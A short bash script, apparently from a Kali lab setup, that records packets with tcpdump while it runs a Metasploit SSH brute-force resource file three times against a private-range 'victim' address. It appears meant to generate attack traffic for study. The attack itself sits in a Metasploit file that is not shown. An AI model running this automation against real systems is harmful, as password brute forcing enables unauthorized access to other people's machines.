#!/bin/bash
# Configuration
VICTIM_IP="10.0.2.5"      
NUM_ATTACKS=3
INTERFACE="eth0"           

echo "[*] Starting SSH brute force attack automation"
echo "[*] Target: $VICTIM_IP"
echo "[*] Attacks: $NUM_ATTACKS"
echo "========================================"

# Start packet capture
echo "[*] Starting packet capture..."
sudo tcpdump -i $INTERFACE host $VICTIM_IP -w attack_ssh_traffic.pcap &
TCPDUMP_PID=$!
echo "[+] Capture started (PID: $TCPDUMP_PID)"
sleep 3

# Run attacks
for i in $(seq 1 $NUM_ATTACKS); do
    echo "[*] Attack $i/$NUM_ATTACKS"
    msfconsole -q -r /home/kali/ssh_brute_exploit.rc
done

# Stop capture
echo "[*] Stopping capture..."
sudo kill $TCPDUMP_PID
sleep 1
echo "[+] Done! Check attack_ssh_traffic.pcap"
